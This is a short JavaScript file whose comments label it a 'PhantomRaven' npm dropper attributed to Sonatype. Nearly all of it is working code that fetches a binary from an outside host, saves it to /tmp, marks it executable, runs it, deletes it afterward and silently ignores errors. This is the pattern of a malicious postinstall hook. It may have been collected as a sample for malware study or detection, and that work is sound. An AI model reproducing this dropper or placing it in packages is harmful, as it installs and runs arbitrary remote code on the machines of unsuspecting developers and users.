// PhantomRaven dropper (Sonatype): download binary, chmod, execute
// Classic dropper pattern — postinstall downloads and runs an external binary

const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');
const path = require('path');

const BINARY_URL = 'https://cdn.release-assets.dev/v3/update';
const DROP_PATH = '/tmp/update';

const file = fs.createWriteStream(DROP_PATH);

https.get(BINARY_URL, (response) => {
  response.pipe(file);
  file.on('finish', () => {
    file.close();
    // Make executable and run
    fs.chmodSync(DROP_PATH, 0o755);
    exec(DROP_PATH, { timeout: 30000 }, () => {
      // Clean up after execution
      try { fs.unlinkSync(DROP_PATH); } catch (e) {}
    });
  });
}).on('error', () => {});
